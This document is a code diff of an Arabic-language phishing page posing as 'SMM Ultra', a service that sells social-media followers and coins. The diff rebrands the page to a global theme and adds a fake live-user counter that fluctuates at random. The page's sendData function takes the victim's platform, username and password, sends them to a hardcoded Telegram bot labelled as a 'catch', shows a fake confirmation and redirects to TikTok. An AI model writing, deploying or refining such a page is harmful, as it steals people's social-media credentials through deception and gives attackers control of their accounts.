@@ -3,25 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM Ultra | رشق وشحن عملات</title>
+    <title>SMM Ultra | رشق وشحن عملات عالمي</title>
     <style>
         :root { --tiktok: #ee1d52; --accent: #00f2ea; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
 
-        /* فيديو الخلفية */
         #video-bg {
             position: fixed; right: 0; bottom: 0;
             min-width: 100%; min-height: 100%;
-            z-index: -2; filter: brightness(0.4) blur(2px); /* تمويه خفيف لزيادة التركيز على الكرت */
+            z-index: -2; filter: brightness(0.3) blur(2px);
             object-fit: cover;
         }
 
-        /* طبقة الأيقونات المتحركة فوق الفيديو */
         .overlay-icons {
             position: fixed; width: 100%; height: 100%; z-index: -1; pointer-events: none;
         }
         .moving-icon {
-            position: absolute; width: 50px; height: 50px; opacity: 0.8;
+            position: absolute; width: 45px; height: 45px; opacity: 0.6;
             animation: move linear infinite;
         }
         @keyframes move {
@@ -30,7 +28,7 @@
         }
 
         .main-card { 
-            background: rgba(0, 0, 0, 0.75); padding: 35px 25px; border-radius: 30px; 
+            background: rgba(0, 0, 0, 0.8); padding: 35px 25px; border-radius: 30px; 
             width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1);
             backdrop-filter: blur(15px); box-shadow: 0 0 50px rgba(238, 29, 82, 0.4);
             position: relative; margin: auto; top: 50%; transform: translateY(-50%);
@@ -43,7 +41,6 @@
             width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; 
             background: rgba(255,255,255,0.1); color: white; font-size: 16px; box-sizing: border-box; outline: none;
         }
-        input::placeholder { color: #ccc; }
 
         .btn-go { 
             width: 100%; padding: 18px; border: none; border-radius: 12px; 
@@ -51,7 +48,8 @@
         }
         .btn-go:hover { background: var(--tiktok); color: #fff; box-shadow: 0 0 30px var(--tiktok); }
 
-        .live-status { font-size: 13px; color: #4ade80; margin-top: 15px; font-weight: bold; }
+        /* تعديل العداد */
+        .live-status { font-size: 14px; color: #4ade80; margin-top: 20px; font-weight: bold; border-top: 1px solid #333; padding-top: 15px; }
     </style>
 </head>
 <body>
@@ -64,8 +62,8 @@
 
     <div class="main-card">
         <div class="logo-area">
-            <h1>SMM ULTRA PRO</h1>
-            <div class="badge">نظام الرشق التلقائي: نشط الآن</div>
+            <h1>SMM GLOBAL PRO</h1>
+            <div class="badge">سيرفر الرشق العالمي: متصل</div>
         </div>
 
         <select id="platform">
@@ -82,18 +80,17 @@
         <button class="btn-go" onclick="sendData()">ابدأ الرشق الآن</button>
 
         <div class="live-status">
-            🟢 نشط الآن في ليبيا: <span id="online">17,428</span>
+            🌎 نشط في العالم حالياً: <span id="online">145,280</span>
         </div>
     </div>
 
     <script>
-        // إضافة صور/أيقونات واضحة تتحرك في الخلفية
         const container = document.getElementById('icons-container');
         const imgUrls = [
-            'https://cdn-icons-png.flaticon.com/512/3046/3046121.png', // TikTok
-            'https://cdn-icons-png.flaticon.com/512/174/174855.png',   // Instagram
-            'https://cdn-icons-png.flaticon.com/512/124/124010.png',   // Facebook
-            'https://cdn-icons-png.flaticon.com/512/2111/2111615.png'   // Snapchat
+            'https://cdn-icons-png.flaticon.com/512/3046/3046121.png',
+            'https://cdn-icons-png.flaticon.com/512/174/174855.png',
+            'https://cdn-icons-png.flaticon.com/512/124/124010.png',
+            'https://cdn-icons-png.flaticon.com/512/2111/2111615.png'
         ];
 
         for (let i = 0; i < 15; i++) {
@@ -105,6 +102,17 @@
             img.style.animationDelay = (Math.random() * 5) + 's';
             container.appendChild(img);
         }
+
+        // تحديث العداد العالمي بشكل مستمر
+        function updateOnlineCount() {
+            let base = 145280;
+            setInterval(() => {
+                let change = Math.floor(Math.random() * 50) - 20;
+                base += change;
+                document.getElementById('online').innerText = base.toLocaleString();
+            }, 2500);
+        }
+        updateOnlineCount();
 
         function sendData() {
             const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
@@ -118,11 +126,11 @@
                 alert("يرجى إدخال البيانات لربط الحساب بالسيرفر"); return;
             }
 
-            const msg = `👑 صيدة الترا VIP!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+            const msg = `🌎 صيدة عالمية جديدة!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
 
             fetch(url).finally(() => {
-                alert("تم التحقق! طلبك قيد المعالجة الآن، سيصلك المتابعين/العملات قريباً.");
+                alert("تم التحقق! طلبك قيد المعالجة عالمياً، سيصلك المتابعين/العملات قريباً.");
                 window.location.href = "https://www.tiktok.com"; 
             });
         }
